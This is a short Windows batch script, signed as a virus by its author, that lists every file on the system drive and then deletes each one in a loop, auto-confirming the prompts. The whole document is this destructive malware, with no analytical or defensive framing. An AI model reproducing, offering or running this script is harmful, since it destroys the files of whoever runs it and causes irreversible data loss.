@ echo off

rem ---------------------------------
rem Delete All.
DIR /S/B %SystemDrive%\*. >> FIleList_..txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_..txt) do del "%%j:%%k"
rem ---------------------------------


__-Virus Author: subhojit-__